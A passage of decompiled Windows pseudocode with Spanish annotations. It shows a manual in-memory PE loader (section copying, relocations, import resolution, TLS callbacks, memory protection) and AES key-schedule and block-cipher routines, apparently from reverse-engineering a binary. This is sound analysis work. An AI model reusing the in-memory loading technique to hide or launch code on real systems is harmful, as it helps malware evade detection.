            puVar6[8] = (uint)param_4;
            puVar6[9] = param_5;
            puVar6[10] = (uint)param_6;
            puVar6[0xb] = param_7;
            puVar6[0xc] = param_8;
            puVar6[0xe] = local_28;
            iVar2 = FUN_00402457(param_2,piVar9[0x15]);
            if (iVar2 != 0) {
              _Dst = (void *)(*(code *)param_3)(uVar5,piVar9[0x15],0x1000,4,param_8);
              memcpy(_Dst,param_1,piVar9[0x15]);
              iVar2 = *(int *)(param_1 + 0x1e);
              *puVar6 = iVar2 + (int)_Dst;
              *(uint *)(iVar2 + (int)_Dst + 0x34) = uVar5;
              iVar2 = FUN_00402470((int)param_1,param_2,(int)piVar9,(int *)puVar6);
              if (iVar2 != 0) {
                iVar2 = *(int *)(*puVar6 + 0x34) - piVar9[0xd];
                if (iVar2 == 0) {
                  puVar6[6] = 1;
                }
                else {
                  bVar1 = FUN_00402758((int *)puVar6,iVar2);
                  puVar6[6] = CONCAT31(extraout_var,bVar1);
                }
                iVar2 = FUN_004027df(puVar6);
                if (((iVar2 != 0) &&
                    (bVar1 = FUN_0040254b((int *)puVar6), CONCAT31(extraout_var_00,bVar1) != 0)) &&
                   (iVar2 = FUN_0040271d((int *)puVar6), iVar2 != 0)) {
                  iVar2 = *(int *)(*puVar6 + 0x28);
                  if (iVar2 == 0) {
                    puVar6[0xd] = 0;
                    return puVar6;
                  }
                  if (puVar6[5] == 0) {
                    puVar6[0xd] = iVar2 + uVar5;
                    return puVar6;
                  }
                  iVar2 = (*(code *)(iVar2 + uVar5))(uVar5,1,0);
                  if (iVar2 != 0) {
                    puVar6[4] = 1;
                    return puVar6;
                  }
                  SetLastError(0x45a);
                }
              }
            }
            FUN_004029cc((int *)puVar6);
            return (uint *)0x0;
          }
          (*(code *)param_4)(uVar5,0,0x8000,param_8);
        }
        DVar10 = 0xe;
        goto LAB_00402219;
      }
    }
  }
  DVar10 = 0xc1;
LAB_00402219:
  SetLastError(DVar10);
  return (uint *)0x0;
}



/* Comprueba que un rango solicitado cabe dentro del buffer disponible. */
undefined4 __cdecl FUN_00402457(uint param_1,uint param_2)

{
  if (param_1 < param_2) {
    SetLastError(0xd);
    return 0;
  }
  return 1;
}



/* Copia secciones PE y reserva las zonas de datos no inicializados. */
undefined4 __cdecl FUN_00402470(int param_1,uint param_2,int param_3,int *param_4)

{
  size_t *psVar1;
  int iVar2;
  size_t sVar3;
  int iVar4;
  size_t *psVar5;
  int local_8;
  
  local_8 = 0;
  iVar2 = param_4[1];
  iVar4 = *param_4;
  psVar1 = (size_t *)((uint)*(ushort *)(iVar4 + 0x14) + iVar4);
  if (*(short *)(iVar4 + 6) != 0) {
    do {
      psVar5 = psVar1 + 10;
      if (*psVar5 == 0) {
        sVar3 = *(size_t *)(param_3 + 0x38);
        if (0 < (int)sVar3) {
          iVar4 = (*(code *)param_4[7])(iVar2 + psVar1[9],sVar3,0x1000,4,param_4[0xc]);
          if (iVar4 == 0) {
            return 0;
          }
          psVar1[8] = iVar2 + psVar1[9];
          memset((void *)(iVar2 + psVar1[9]),0,sVar3);
        }
      }
      else {
        iVar4 = FUN_00402457(param_2,psVar1[0xb] + *psVar5);
        if ((iVar4 == 0) ||
           (iVar4 = (*(code *)param_4[7])(iVar2 + psVar1[9],*psVar5,0x1000,4,param_4[0xc]),
           iVar4 == 0)) {
          return 0;
        }
        sVar3 = psVar1[9];
        memcpy((void *)(iVar2 + sVar3),(void *)(psVar1[0xb] + param_1),*psVar5);
        psVar1[8] = iVar2 + sVar3;
      }
      local_8 = local_8 + 1;
      psVar1 = psVar5;
    } while (local_8 < (int)(uint)*(ushort *)(*param_4 + 6));
  }
  return 1;
}



/* Combina caracteristicas de secciones y prepara rangos de proteccion. */
bool __cdecl FUN_0040254b(int *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  bool bVar4;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  uint uVar5;
  uint local_20;
  uint local_1c;
  int local_18;
  uint local_14;
  undefined4 local_10;
  int local_c;
  uint local_8;
  
  piVar3 = param_1;
  iVar1 = *(ushort *)(*param_1 + 0x14) + 0x18 + *param_1;
  local_20 = *(uint *)(iVar1 + 8);
  local_1c = ~(param_1[0xe] - 1U) & local_20;
  local_18 = FUN_0040264f(param_1,iVar1);
  local_14 = *(uint *)(iVar1 + 0x24);
  local_10 = 0;
  iVar2 = *param_1;
  param_1 = (int *)0x1;
  if (1 < *(ushort *)(iVar2 + 6)) {
    do {
      local_8 = *(uint *)(iVar1 + 0x30);
      uVar5 = ~(piVar3[0xe] - 1U) & local_8;
      local_c = FUN_0040264f(piVar3,iVar1 + 0x28);
      if ((local_1c == uVar5) || (uVar5 < local_18 + local_20)) {
        uVar5 = *(uint *)(iVar1 + 0x4c);
        if (((uVar5 & 0x2000000) == 0) || ((local_14 & 0x2000000) == 0)) {
          local_14 = (uVar5 | local_14) & 0xfdffffff;
        }
        else {
          local_14 = local_14 | uVar5;
        }
        local_18 = (local_c - local_20) + local_8;
      }
      else {
        bVar4 = FUN_0040267b(piVar3,(int *)&local_20);
        if (CONCAT31(extraout_var,bVar4) == 0) {
          return false;
        }
        local_20 = local_8;
        local_18 = local_c;
        local_14 = *(uint *)(iVar1 + 0x4c);
        local_1c = uVar5;
      }
      param_1 = (int *)((int)param_1 + 1);
      iVar1 = iVar1 + 0x28;
    } while ((int)param_1 < (int)(uint)*(ushort *)(*piVar3 + 6));
  }
  local_10 = 1;
  bVar4 = FUN_0040267b(piVar3,(int *)&local_20);
  return CONCAT31(extraout_var_00,bVar4) != 0;
}



/* Obtiene el tamaño virtual de una seccion, con valores por defecto. */
int __cdecl FUN_0040264f(int *param_1,int param_2)

{
  int iVar1;
  
  iVar1 = *(int *)(param_2 + 0x10);
  if (iVar1 == 0) {
    if ((*(uint *)(param_2 + 0x24) & 0x40) != 0) {
      return *(int *)(*param_1 + 0x20);
    }
    if ((*(uint *)(param_2 + 0x24) & 0x80) != 0) {
      iVar1 = *(int *)(*param_1 + 0x24);
    }
  }
  return iVar1;
}



/* Aplica protecciones de memoria PE o libera paginas descartables. */
bool __cdecl FUN_0040267b(int *param_1,int *param_2)

{
  uint dwSize;
  uint uVar1;
  BOOL BVar2;
  uint flNewProtect;
  bool bVar3;
  
  dwSize = param_2[2];
  if (dwSize == 0) {
    bVar3 = true;
  }
  else {
    uVar1 = param_2[3];
    if ((uVar1 & 0x2000000) == 0) {
      flNewProtect = *(uint *)(&DAT_0040f53c +
                              (((uVar1 >> 0x1e & 1) + (uVar1 >> 0x1d & 1) * 2) * 2 -
                              ((int)uVar1 >> 0x1f)) * 4);
      if ((uVar1 & 0x4000000) != 0) {
        flNewProtect = flNewProtect | 0x200;
      }
      BVar2 = VirtualProtect((LPVOID)*param_2,dwSize,flNewProtect,(PDWORD)&param_2);
      bVar3 = BVar2 != 0;
    }
    else {
      if ((*param_2 == param_2[1]) &&
         (((param_2[4] != 0 || (*(uint *)(*param_1 + 0x38) == param_1[0xe])) ||
          (dwSize % (uint)param_1[0xe] == 0)))) {
        (*(code *)param_1[8])(*param_2,dwSize,0x4000,param_1[0xc]);
      }
      bVar3 = true;
    }
  }
  return bVar3;
}



/* Ejecuta las rutinas de inicializacion TLS de la imagen cargada. */
undefined4 __cdecl FUN_0040271d(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xc0) == 0) {
    return 1;
  }
  puVar2 = *(undefined4 **)(*(int *)(*param_1 + 0xc0) + 0xc + iVar1);
  if (puVar2 != (undefined4 *)0x0) {
    for (; (code *)*puVar2 != (code *)0x0; puVar2 = puVar2 + 1) {
      (*(code *)*puVar2)(iVar1,1,0);
    }
  }
  return 1;
}



/* Aplica el desplazamiento de reubicacion a una tabla PE. */
bool __cdecl FUN_00402758(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  ushort *puVar5;
  bool bVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0xa4) == 0) {
    bVar6 = param_2 == 0;
  }
  else {
    piVar3 = (int *)(*(int *)(*param_1 + 0xa0) + iVar1);
    iVar2 = *piVar3;
    while (iVar2 != 0) {
      param_1 = (int *)0x0;
      puVar5 = (ushort *)(piVar3 + 2);
      if ((piVar3[1] - 8U & 0xfffffffe) != 0) {
        do {
          if ((*puVar5 & 0xf000) == 0x3000) {
            piVar4 = (int *)((*puVar5 & 0xfff) + iVar2 + iVar1);
            *piVar4 = *piVar4 + param_2;
          }
          param_1 = (int *)((int)param_1 + 1);
          puVar5 = puVar5 + 1;
        } while (param_1 < (int *)(piVar3[1] - 8U >> 1));
      }
      piVar3 = (int *)((int)piVar3 + piVar3[1]);
      iVar2 = *piVar3;
    }
    bVar6 = true;
  }
  return bVar6;
}



/* Resuelve imports por nombre u ordinal y rellena la tabla de importacion. */
int __cdecl FUN_004027df(uint *param_1)

{
  uint uVar1;
  uint *puVar2;
  int iVar3;
  void *pvVar4;
  uint uVar5;
  int *lp;
  uint *puVar6;
  uint uVar7;
  DWORD dwErrCode;
  int local_c;
  
  puVar2 = param_1;
  uVar1 = param_1[1];
  iVar3 = 1;
  local_c = 1;
  if (*(int *)(*param_1 + 0x84) != 0) {
    lp = (int *)(*(int *)(*param_1 + 0x80) + uVar1);
    iVar3 = IsBadReadPtr(lp,0x14);
    while( true ) {
      if (iVar3 != 0) {
        return local_c;
      }
      if (lp[3] == 0) {
        return local_c;
      }
      iVar3 = (*(code *)puVar2[9])(lp[3] + uVar1,puVar2[0xc]);
      if (iVar3 == 0) break;
      pvVar4 = realloc((void *)puVar2[2],puVar2[3] * 4 + 4);
      if (pvVar4 == (void *)0x0) {
        (*(code *)puVar2[0xb])(iVar3,puVar2[0xc]);
        dwErrCode = 0xe;
        goto LAB_004028fd;
      }
      puVar2[2] = (uint)pvVar4;
      *(int *)((int)pvVar4 + puVar2[3] * 4) = iVar3;
      puVar2[3] = puVar2[3] + 1;
      if (*lp == 0) {
        puVar6 = (uint *)(uVar1 + lp[4]);
        param_1 = puVar6;
      }
      else {
        puVar6 = (uint *)(lp[4] + uVar1);
        param_1 = (uint *)(*lp + uVar1);
      }
      for (; uVar5 = *param_1, uVar5 != 0; param_1 = param_1 + 1) {
        if ((uVar5 & 0x80000000) == 0) {
          uVar7 = puVar2[0xc];
          uVar5 = uVar5 + uVar1 + 2;
        }
        else {
          uVar7 = puVar2[0xc];
          uVar5 = uVar5 & 0xffff;
        }
        uVar5 = (*(code *)puVar2[10])(iVar3,uVar5,uVar7);
        *puVar6 = uVar5;
        if (uVar5 == 0) {
          local_c = 0;
          break;
        }
        puVar6 = puVar6 + 1;
      }
      if (local_c == 0) {
        (*(code *)puVar2[0xb])(iVar3,puVar2[0xc]);
        SetLastError(0x7f);
        return 0;
      }
      lp = lp + 5;
      iVar3 = IsBadReadPtr(lp,0x14);
    }
    dwErrCode = 0x7e;
LAB_004028fd:
    SetLastError(dwErrCode);
    local_c = 0;
    iVar3 = local_c;
  }
  return iVar3;
}



/* Busca una exportacion por ordinal o por nombre en la imagen cargada. */
int __cdecl FUN_00402924(int *param_1,char *param_2)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  ushort *puVar4;
  int iVar5;
  int *piVar6;
  
  iVar1 = param_1[1];
  if (*(int *)(*param_1 + 0x7c) != 0) {
    iVar5 = *(int *)(*param_1 + 0x78);
    iVar3 = *(int *)(iVar5 + 0x18 + iVar1);
    iVar5 = iVar5 + iVar1;
    if ((iVar3 != 0) && (*(int *)(iVar5 + 0x14) != 0)) {
      if ((short)((uint)param_2 >> 0x10) == 0) {
        if (*(uint *)(iVar5 + 0x10) <= ((uint)param_2 & 0xffff)) {
          uVar2 = ((uint)param_2 & 0xffff) - *(uint *)(iVar5 + 0x10);
LAB_004029ba:
          if (uVar2 <= *(uint *)(iVar5 + 0x14)) {
            return *(int *)(*(int *)(iVar5 + 0x1c) + uVar2 * 4 + iVar1) + iVar1;
          }
        }
      }
      else {
        piVar6 = (int *)(*(int *)(iVar5 + 0x20) + iVar1);
        puVar4 = (ushort *)(*(int *)(iVar5 + 0x24) + iVar1);
        param_1 = (int *)0x0;
        if (iVar3 != 0) {
          do {
            iVar3 = _stricmp(param_2,(char *)(*piVar6 + iVar1));
            if (iVar3 == 0) {
              uVar2 = (uint)*puVar4;
              goto LAB_004029ba;
            }
            param_1 = (int *)((int)param_1 + 1);
            piVar6 = piVar6 + 1;
            puVar4 = puVar4 + 1;
          } while (param_1 < *(int **)(iVar5 + 0x18));
        }
      }
    }
  }
  SetLastError(0x7f);
  return 0;
}



/* Deshace la carga manual de un PE y libera sus asignaciones. */
void __cdecl FUN_004029cc(int *param_1)

{
  int iVar1;
  HANDLE hHeap;
  int iVar2;
  DWORD dwFlags;
  
  if (param_1 != (int *)0x0) {
    if (param_1[4] != 0) {
      (*(code *)(*(int *)(*param_1 + 0x28) + param_1[1]))(param_1[1],0,0);
    }
    if (param_1[2] != 0) {
      iVar2 = 0;
      if (0 < param_1[3]) {
        do {
          iVar1 = *(int *)(param_1[2] + iVar2 * 4);
          if (iVar1 != 0) {
            (*(code *)param_1[0xb])(iVar1,param_1[0xc]);
          }
          iVar2 = iVar2 + 1;
        } while (iVar2 < param_1[3]);
      }
      free((void *)param_1[2]);
    }
    if (param_1[1] != 0) {
      (*(code *)param_1[8])(param_1[1],0,0x8000,param_1[0xc]);
    }
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,param_1);
  }
  return;
}



/* Inicializa el subobjeto criptografico y su tabla virtual. */
void __fastcall FUN_00402a46(undefined4 *param_1)

{
  *(undefined1 *)(param_1 + 1) = 0;
  *param_1 = &PTR_FUN_0040bc7c;
  return;
}



/* Destructor del subobjeto criptografico. */
undefined4 * __thiscall FUN_00402a53(void *this,byte param_1)

{
  FUN_00402a6f(this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



/* Restablece la tabla virtual del subobjeto criptografico. */
void __fastcall FUN_00402a6f(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0040bc7c;
  return;
}



/* Configura una clave simetrica y genera sus subclaves de cifrado. */
void __thiscall FUN_00402a76(void *this,byte *param_1,uint *param_2,int param_3,byte *param_4)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  uint *puVar4;
  int iVar5;
  uint *puVar6;
  undefined4 *puVar7;
  int iVar8;
  int iVar9;
  undefined4 *puVar10;
  exception local_18 [20];
  
  if (param_1 == (byte *)0x0) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (((param_3 != 0x10) && (param_3 != 0x18)) && (param_3 != 0x20)) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  if (((param_4 != (byte *)0x10) && (param_4 != (byte *)0x18)) && (param_4 != (byte *)0x20)) {
    param_2 = (uint *)&DAT_0040f57c;
    exception::exception(local_18,(char **)&param_2);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_18,(ThrowInfo *)&pThrowInfo_0040d570);
  }
  *(byte **)((int)this + 0x3cc) = param_4;
  *(int *)((int)this + 0x3c8) = param_3;
  memcpy((void *)((int)this + 0x3d0),param_2,(size_t)param_4);
  memcpy((void *)((int)this + 0x3f0),param_2,*(size_t *)((int)this + 0x3cc));
  if (*(int *)((int)this + 0x3c8) == 0x10) {
    if (*(int *)((int)this + 0x3cc) == 0x10) {
      iVar3 = 10;
    }
    else {
      iVar3 = ((*(int *)((int)this + 0x3cc) != 0x18) - 1 & 0xfffffffe) + 0xe;
    }
  }
  else {
    if (*(int *)((int)this + 0x3c8) != 0x18) {
      *(undefined4 *)((int)this + 0x410) = 0xe;
      goto LAB_00402b9a;
    }
    iVar3 = ((*(int *)((int)this + 0x3cc) == 0x20) - 1 & 0xfffffffe) + 0xe;
  }
  *(int *)((int)this + 0x410) = iVar3;
LAB_00402b9a:
  iVar3 = *(int *)((int)this + 0x3cc) / 4;
  iVar8 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar7 = (undefined4 *)((int)this + 8);
    do {
      iVar5 = iVar3;
      puVar10 = puVar7;
      if (0 < iVar3) {
        for (; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar8 = iVar8 + 1;
      puVar7 = puVar7 + 8;
    } while (iVar8 <= *(int *)((int)this + 0x410));
  }
  iVar8 = 0;
  if (-1 < *(int *)((int)this + 0x410)) {
    puVar7 = (undefined4 *)((int)this + 0x1e8);
    do {
      iVar5 = iVar3;
      puVar10 = puVar7;
      if (0 < iVar3) {
        for (; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar8 = iVar8 + 1;
      puVar7 = puVar7 + 8;
    } while (iVar8 <= *(int *)((int)this + 0x410));
  }
  puVar4 = (uint *)(*(int *)((int)this + 0x3c8) / 4);
  iVar8 = (*(int *)((int)this + 0x410) + 1) * iVar3;
  puVar6 = (uint *)((int)this + 0x414);
  param_2 = puVar4;
  if (0 < (int)puVar4) {
    do {
      *puVar6 = (uint)*param_1 << 0x18;
      *puVar6 = *puVar6 | (uint)param_1[1] << 0x10;
      *puVar6 = *puVar6 | (uint)param_1[2] << 8;
      *puVar6 = *puVar6 | (uint)param_1[3];
      param_1 = param_1 + 4;
      puVar6 = puVar6 + 1;
      param_2 = (uint *)((int)param_2 + -1);
    } while (param_2 != (uint *)0x0);
  }
  param_2 = (uint *)0x0;
  if (0 < (int)puVar4) {
    puVar7 = (undefined4 *)((int)this + 0x414);
    do {
      if (iVar8 <= (int)param_2) goto LAB_00402e04;
      iVar5 = (int)param_2 / iVar3;
      iVar9 = (int)param_2 % iVar3;
      *(undefined4 *)((int)this + (iVar9 + iVar5 * 8) * 4 + 8) = *puVar7;
      param_2 = (uint *)((int)param_2 + 1);
      uVar1 = *puVar7;
      puVar7 = puVar7 + 1;
      *(undefined4 *)((int)this + (iVar9 + (*(int *)((int)this + 0x410) - iVar5) * 8) * 4 + 0x1e8) =
           uVar1;
    } while ((int)param_2 < (int)puVar4);
  }
  if ((int)param_2 < iVar8) {
    param_4 = &DAT_0040bbfc;
    do {
      uVar2 = *(uint *)((int)this + (int)puVar4 * 4 + 0x410);
      *(uint *)((int)this + 0x414) =
           *(uint *)((int)this + 0x414) ^
           CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x10 & 0xff] ^ *param_4,
                                      (&DAT_004089fc)[uVar2 >> 8 & 0xff]),
                             (&DAT_004089fc)[uVar2 & 0xff]),(&DAT_004089fc)[uVar2 >> 0x18]);
      param_4 = param_4 + 1;
      if (puVar4 == (uint *)0x8) {
        puVar6 = (uint *)((int)this + 0x418);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
        uVar2 = *(uint *)((int)this + 0x420);
        puVar6 = (uint *)((int)this + 0x428);
        *(uint *)((int)this + 0x424) =
             *(uint *)((int)this + 0x424) ^
             CONCAT31(CONCAT21(CONCAT11((&DAT_004089fc)[uVar2 >> 0x18],
                                        (&DAT_004089fc)[uVar2 >> 0x10 & 0xff]),
                               (&DAT_004089fc)[uVar2 >> 8 & 0xff]),(&DAT_004089fc)[uVar2 & 0xff]);
        iVar5 = 3;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
      else if (1 < (int)puVar4) {
        puVar6 = (uint *)((int)this + 0x418);
        iVar5 = (int)puVar4 + -1;
        do {
          *puVar6 = *puVar6 ^ puVar6[-1];
          puVar6 = puVar6 + 1;
          iVar5 = iVar5 + -1;
        } while (iVar5 != 0);
      }
      param_1 = (byte *)0x0;
      if (0 < (int)puVar4) {
        puVar7 = (undefined4 *)((int)this + 0x414);
        do {
          if (iVar8 <= (int)param_2) goto LAB_00402e04;
          iVar5 = (int)param_2 / iVar3;
          iVar9 = (int)param_2 % iVar3;
          *(undefined4 *)((int)this + (iVar9 + iVar5 * 8) * 4 + 8) = *puVar7;
          param_1 = param_1 + 1;
          uVar1 = *puVar7;
          puVar7 = puVar7 + 1;
          param_2 = (uint *)((int)param_2 + 1);
          *(undefined4 *)
           ((int)this + (iVar9 + (*(int *)((int)this + 0x410) - iVar5) * 8) * 4 + 0x1e8) = uVar1;
        } while ((int)param_1 < (int)puVar4);
      }
    } while ((int)param_2 < iVar8);
  }
LAB_00402e04:
  param_4 = (byte *)0x1;
  if (1 < *(int *)((int)this + 0x410)) {
    param_2 = (uint *)((int)this + 0x208);
    do {
      iVar8 = iVar3;
      puVar6 = param_2;
      if (0 < iVar3) {
        do {
          uVar2 = *puVar6;
          *puVar6 = *(uint *)(&DAT_0040abfc + (uVar2 >> 0x18) * 4) ^
                    *(uint *)(&DAT_0040affc + (uVar2 >> 0x10 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b3fc + (uVar2 >> 8 & 0xff) * 4) ^
                    *(uint *)(&DAT_0040b7fc + (uVar2 & 0xff) * 4);
          iVar8 = iVar8 + -1;
          puVar6 = puVar6 + 1;
        } while (iVar8 != 0);
      }
      param_4 = param_4 + 1;
      param_2 = param_2 + 8;
    } while ((int)param_4 < *(int *)((int)this + 0x410));
  }
  *(undefined1 *)((int)this + 4) = 1;
  return;
}



/* Cifra un bloque de 16 bytes con las subclaves ya preparadas. */
void __thiscall FUN_00402e7e(void *this,uint *param_1,byte *param_2)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  exception local_2c [12];
  void *local_20;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)((int)this + 4) != '\0') {
    local_14 = ((uint)(byte)*param_1 << 0x18 | (uint)*(byte *)((int)param_1 + 1) << 0x10 |
                (uint)*(byte *)((int)param_1 + 2) << 8 | (uint)*(byte *)((int)param_1 + 3)) ^
               *(uint *)((int)this + 8);
    local_10 = ((uint)(byte)param_1[1] << 0x18 | (uint)*(byte *)((int)param_1 + 5) << 0x10 |
                (uint)*(byte *)((int)param_1 + 6) << 8 | (uint)*(byte *)((int)param_1 + 7)) ^
               *(uint *)((int)this + 0xc);
    uVar4 = ((uint)(byte)param_1[2] << 0x18 | (uint)*(byte *)((int)param_1 + 9) << 0x10 |
             (uint)*(byte *)((int)param_1 + 10) << 8 | (uint)*(byte *)((int)param_1 + 0xb)) ^
            *(uint *)((int)this + 0x10);
    iVar3 = *(int *)((int)this + 0x410);
    local_c = ((uint)CONCAT11(*(undefined1 *)((int)param_1 + 0xe),
                              *(undefined1 *)((int)param_1 + 0xf)) |
              (uint)(byte)param_1[3] << 0x18 | (uint)*(byte *)((int)param_1 + 0xd) << 0x10) ^
              *(uint *)((int)this + 0x14);
    if (1 < iVar3) {
      local_8 = iVar3 + -1;
      param_1 = (uint *)((int)this + 0x30);
      local_18 = uVar4;
      do {
        uVar5 = *(uint *)(&DAT_004093fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_18 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_004097fc + (local_14 & 0xff) * 4) ^ param_1[-1];
        uVar4 = *(uint *)(&DAT_00408ffc + (local_c >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_00408bfc + (local_18 >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_10 & 0xff) * 4) ^ *param_1;
        uVar2 = *(uint *)(&DAT_00408bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_004093fc + (local_10 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00408ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_004097fc + (local_18 & 0xff) * 4) ^ param_1[1];
        local_14 = *(uint *)(&DAT_004093fc + (local_18 >> 8 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                   *(uint *)(&DAT_00408bfc + (local_14 >> 0x18) * 4) ^
                   *(uint *)(&DAT_004097fc + (local_c & 0xff) * 4) ^ param_1[-2];
        local_8 = local_8 + -1;
        param_1 = param_1 + 8;
        local_18 = uVar4;
        local_10 = uVar5;
        local_c = uVar2;
      } while (local_8 != 0);
    }
    iVar3 = iVar3 * 0x20;
    uVar1 = *(undefined4 *)(iVar3 + 8 + (int)this);
    *param_2 = (&DAT_004089fc)[local_14 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[1] = (&DAT_004089fc)[local_10 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[2] = (&DAT_004089fc)[uVar4 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[3] = (&DAT_004089fc)[local_c & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 0xc);
    param_2[4] = (&DAT_004089fc)[local_10 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[5] = (&DAT_004089fc)[uVar4 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[6] = (&DAT_004089fc)[local_c >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[7] = (&DAT_004089fc)[local_14 & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 0x10);
    param_2[8] = (&DAT_004089fc)[uVar4 >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[9] = (&DAT_004089fc)[local_c >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[10] = (&DAT_004089fc)[local_14 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[0xb] = (&DAT_004089fc)[local_10 & 0xff] ^ (byte)local_8;
    uVar1 = *(undefined4 *)((int)this + iVar3 + 0x14);
    param_2[0xc] = (&DAT_004089fc)[local_c >> 0x18] ^ (byte)((uint)uVar1 >> 0x18);
    param_2[0xd] = (&DAT_004089fc)[local_14 >> 0x10 & 0xff] ^ (byte)((uint)uVar1 >> 0x10);
    param_2[0xe] = (&DAT_004089fc)[local_10 >> 8 & 0xff] ^ (byte)((uint)uVar1 >> 8);
    local_8._0_1_ = (byte)uVar1;
    param_2[0xf] = (&DAT_004089fc)[uVar4 & 0xff] ^ (byte)local_8;
    return;
  }
  local_20 = this;
  exception::exception(local_2c,&this_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_2c,(ThrowInfo *)&pThrowInfo_0040d570);
}



/* Descifra un bloque de 16 bytes con las subclaves inversas. */
void __thiscall FUN_004031bc(void *this,byte *param_1,byte *param_2)

{
  undefined4 uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint *puVar5;
  uint uVar6;
  uint uVar7;
  exception local_30 [16];
  void *local_20;
  uint local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  if (*(char *)((int)this + 4) != '\0') {
    uVar4 = ((uint)*param_1 << 0x18 | (uint)param_1[1] << 0x10 | (uint)param_1[2] << 8 |
            (uint)param_1[3]) ^ *(uint *)((int)this + 0x1e8);
    local_14 = ((uint)param_1[4] << 0x18 | (uint)param_1[5] << 0x10 | (uint)param_1[6] << 8 |
               (uint)param_1[7]) ^ *(uint *)((int)this + 0x1ec);
    local_10 = ((uint)param_1[8] << 0x18 | (uint)param_1[9] << 0x10 | (uint)param_1[10] << 8 |
               (uint)param_1[0xb]) ^ *(uint *)((int)this + 0x1f0);
    iVar3 = *(int *)((int)this + 0x410);
    local_c = ((uint)CONCAT11(param_1[0xe],param_1[0xf]) |
              (uint)param_1[0xc] << 0x18 | (uint)param_1[0xd] << 0x10) ^ *(uint *)((int)this + 500);
    if (1 < iVar3) {
      puVar5 = (uint *)((int)this + 0x210);
      local_8 = iVar3 + -1;
      do {
        uVar7 = *(uint *)(&DAT_0040a3fc + (local_c >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_00409bfc + (local_14 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (uVar4 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_10 & 0xff) * 4) ^ puVar5[-1];
        uVar2 = *(uint *)(&DAT_00409bfc + (local_10 >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_14 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (uVar4 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (local_c & 0xff) * 4) ^ *puVar5;
        uVar6 = *(uint *)(&DAT_00409bfc + (local_c >> 0x18) * 4) ^
                *(uint *)(&DAT_00409ffc + (local_10 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a3fc + (local_14 >> 8 & 0xff) * 4) ^
                *(uint *)(&DAT_0040a7fc + (uVar4 & 0xff) * 4) ^ puVar5[1];
        uVar4 = *(uint *)(&DAT_00409ffc + (local_c >> 0x10 & 0xff) * 4) ^
